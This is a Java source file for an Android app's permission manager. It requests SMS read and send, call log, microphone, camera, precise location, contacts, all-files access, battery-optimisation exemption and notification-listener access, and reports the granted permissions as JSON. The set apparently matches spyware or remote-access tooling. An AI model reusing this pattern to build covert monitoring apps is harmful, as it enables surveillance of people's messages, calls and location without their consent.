package com.fason.app.core.permissions;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.fason.app.core.FasonApp;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

// Permission manager for request and check
public final class PermissionManager {

    private PermissionManager() {}

    // Get required permissions list
    public static String[] getRequiredPerms() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.SEND_SMS);
        perms.add(Manifest.permission.READ_PHONE_STATE);
        perms.add(Manifest.permission.READ_CALL_LOG);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(Manifest.permission.READ_CONTACTS);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        return perms.toArray(new String[0]);
    }

    // Request runtime permissions
    public static void requestPerms(Activity act, int reqCode) {
        List<String> needed = new ArrayList<>();
        for (String p : getRequiredPerms()) {
            if (!canIUse(p)) needed.add(p);
        }
        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(act, needed.toArray(new String[0]), reqCode);
        }
    }

    // Check all runtime permissions granted
    public static boolean hasAllPerms() {
        for (String p : getRequiredPerms()) {
            if (!canIUse(p)) return false;
        }
        return true;
    }

    // Check storage manager permission (Android 11+)
    public static boolean hasStorageManager() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager();
        }
        return true;
    }

    // Request storage manager permission
    public static void requestStorageManager(Activity act) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                i.setData(Uri.parse("package:" + act.getPackageName()));
                act.startActivity(i);
            } catch (Exception e) {
                try {
                    act.startActivity(new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION));
                } catch (Exception ignored) {}
            }
        }
    }

    // Check battery optimization exemption
    public static boolean hasBatteryExemption(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
        }
        return true;
    }

    // Request battery optimization exemption
    public static void requestBatteryExemption(Activity act) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !hasBatteryExemption(act)) {
            try {
                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                i.setData(Uri.parse("package:" + act.getPackageName()));
                act.startActivity(i);
            } catch (Exception ignored) {}
        }
    }

    // Check notification listener enabled
    public static boolean hasNotifAccess(Context ctx) {
        String listeners = Settings.Secure.getString(ctx.getContentResolver(), "enabled_notification_listeners");
        return listeners != null && listeners.contains(ctx.getPackageName());
    }

    // Request notification listener access
    public static void requestNotifAccess(Activity act) {
        if (!hasNotifAccess(act)) {
            try {
                act.startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            } catch (Exception ignored) {}
        }
    }

    // Check if permission granted
    public static boolean canIUse(String perm) {
        if (perm == null) return false;
        try {
            return ContextCompat.checkSelfPermission(
                FasonApp.getContext(), perm) == PackageManager.PERMISSION_GRANTED;
        } catch (Exception e) {
            return false;
        }
    }

    // Get granted permissions as JSON
    public static JSONObject getGranted() {
        JSONObject data = new JSONObject();
        try {
            Context ctx = FasonApp.getContext();
            JSONArray perms = new JSONArray();
            PackageInfo pi = ctx.getPackageManager().getPackageInfo(
                ctx.getPackageName(), PackageManager.GET_PERMISSIONS);

            if (pi.requestedPermissions != null) {
                for (String perm : pi.requestedPermissions) {
                    if (canIUse(perm)) perms.put(perm);
                }
            }
            data.put("permissions", perms);
        } catch (Exception e) {
            try { data.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return data;
    }

    // Legacy method
    public static JSONObject getGrantedPermissions() {
        return getGranted();
    }
}
